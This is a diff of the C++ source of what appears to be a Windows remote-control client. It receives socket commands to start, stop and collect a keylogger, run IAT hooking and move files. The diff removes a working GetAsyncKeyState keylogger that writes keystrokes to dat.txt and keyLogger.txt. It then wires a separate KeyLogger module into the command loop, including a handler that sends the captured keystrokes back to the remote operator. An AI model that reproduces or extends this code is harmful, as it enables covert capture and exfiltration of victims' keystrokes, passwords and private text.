@@ -9,7 +9,7 @@
 #include "Aclapi.h""
 #include <thread>
 #include <tchar.h>
-
+#include "KeyLogger.h"
 using namespace std;
 
 #define DEFAULT_BUFLEN 1050
@@ -284,119 +284,7 @@ void moveFile(SocketManager & socketManager, SOCKET & socket)
 	result = socketManager.send_data(socket, w.c_str());
 }
 
-char convertKey(int key)
-{
-	switch (key)
-	{
-	case 49: return '!';
-	case 50: return '@';
-	case 51: return '#';
-	case 52: return '$';
-	case 53: return '%';
-	case 54: return '^';
-	case 55: return '&';
-	case 56: return '*';
-	case 57: return '(';
-	case 48: return ')';
-	case 45: return '_';
-	case 61: return '+';
-		//case 56: return '*';
-	}
-	return '\0';
-}
-
-void keyLOG(string input) {
-	fstream LogFile;
-	LogFile.open("keyLogger.txt", fstream::app);
-	if (LogFile.is_open()) {
-		LogFile << input;
-		LogFile.close();
-	}
-}
-
-bool SpecialKeys(int S_Key) {
-	switch (S_Key) {
-	case VK_CONTROL:
-		keyLOG("#CTRL#");
-		return true;
-	case VK_TAB:
-		keyLOG("\t");
-		return true;
-	case VK_SPACE:
-		keyLOG(" ");
-		return true;
-	case VK_RETURN:
-		keyLOG("\n");
-		return true;
-	case '¾':
-		keyLOG(".");
-		return true;
-	case VK_BACK:
-		keyLOG("\b");
-		return true;
-	case VK_RBUTTON:
-		keyLOG("#R_CLICK#");
-		return true;
-	case VK_SHIFT:
-		keyLOG("");
-		return true;
-	default:
-		return false;
-	}
-}
-
-void stopKeyLogger()
-{
-
-}
-
-DWORD WINAPI startKeyLogger()
-{
-	char KEY = 'x';
-	while (true) {
-		Sleep(10);
-		for (int KEY = 8; KEY <= 190; KEY++)
-		{
-			if (GetAsyncKeyState(KEY) == -32767) {
-				if (SpecialKeys(KEY) == false) {
-					fstream LogFile;
-					LogFile.open("dat.txt", fstream::app);
-					if (LogFile.is_open()) {
-						if (KEY >= 65 && KEY <= 90) // letters
-						{
-							if ((GetKeyState(VK_SHIFT) & 0x8000) || (GetKeyState(VK_CAPITAL) & 0x0001)) // capital letters
-							{
-								LogFile << char(KEY);
-							}
-							else // lower letters
-							{
-								LogFile << char(KEY + 32);
-							}
-						}
-						else // not letters
-						{
-							if (GetKeyState(VK_SHIFT) & 0x8000) // shift is on 
-							{
-								char newKey = convertKey(KEY);
-								if (newKey != '\0')
-								{
-									LogFile << newKey;
-								}
-							}
-							else // shift is off 
-							{
-								LogFile << char(KEY);
-							}
-						}
-						LogFile.close();
-					}
-				}
-			}
-		}
-	}
-}
-
-void iatHooking(SocketManager & socketManager, SOCKET & socket)
+void iatHooking(SocketManager & socketManager, SOCKET & socket)//TODO:update according to main
 {
 	int result;
 	char recvbuf[DEFAULT_BUFLEN * 4];
@@ -442,11 +330,12 @@ void iatHooking(SocketManager & socketManager, SOCKET & socket)
 	*/
 }
 
-int main12(int argc, char **argv)
+int main1(int argc, char **argv)
 {
 	SocketManager socketManager;
 	WindowsSocket windowsSocket;
 	SOCKET socket = INVALID_SOCKET;
+	HANDLE keyLoggerHandle = NULL;
 
 	struct addrinfo *result = NULL, hints;
 	char *sendbuf = "this is a test14";
@@ -494,7 +383,6 @@ int main12(int argc, char **argv)
 		iResult = socketManager.send_data(socket, sendbuf);
 
 		printf("Bytes Sent: %ld\n", iResult);
-
 		// Receive until the peer closes the connection
 		do {
 			try
@@ -550,13 +438,17 @@ int main12(int argc, char **argv)
 					}
 					else if (!strcmp(recvbuf, "START_KEY_LOGGER"))
 					{
-						//CreateThread(NULL,)
-						startKeyLogger();//from differnet thread
+						keyLoggerHandle = CreateThread(NULL, 0, KeyLogger::startKeyLogger, NULL, 0, NULL);
+					}
+					else if (!strcmp(recvbuf, "GET_KEY_LOGGER_DATA"))
+					{
+						char* data = KeyLogger::getKeyLoggerData();//from differnet thread
+						socketManager.send_data(socket, data);
 					}
 					else if (!strcmp(recvbuf, "STOP_KEY_LOGGER"))
 					{
 						//CreateThread(NULL,)
-						stopKeyLogger();//from differnet thread
+						KeyLogger::stopKeyLogger(keyLoggerHandle);//from differnet thread
 					}
 					else if (!strcmp(recvbuf, "IAT_HOOKING"))
 					{
@@ -594,8 +486,30 @@ int main12(int argc, char **argv)
 	}
 }
 
-
 int main()
+{
+	char * c = KeyLogger::getKeyLoggerData();
+	cout<<c;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+int mainIAT()
 {
 	//LPTSTR exePath = _tcsdup(TEXT("C:\\Users\\admin\\Documents\\PE\\HOOKING1\\notepad.exe"));
 	LPTSTR exePath = _tcsdup(TEXT("..\\Server\\IAT Hooking\\Hooked\\Debug\\Hooked.exe"));
@@ -638,22 +552,5 @@ int main()
 	//WaitForSingleObject(hthread, INFINITE);
 	CloseHandle(hprocess);
 	CloseHandle(hthread);
-	return 0;
-}
-
-void task1(std::string msg)
-{
-	while (true)
-	{
-		std::cout << "task1 says: " << msg;
-	}
-}
-int main3()
-{
-	std::thread t1(task1, "Hello");
-	t1.join();
-	Sleep(3);
-	t1.detach();
-	std::cout << "tehilla says: " << endl;
 	return 0;
 }
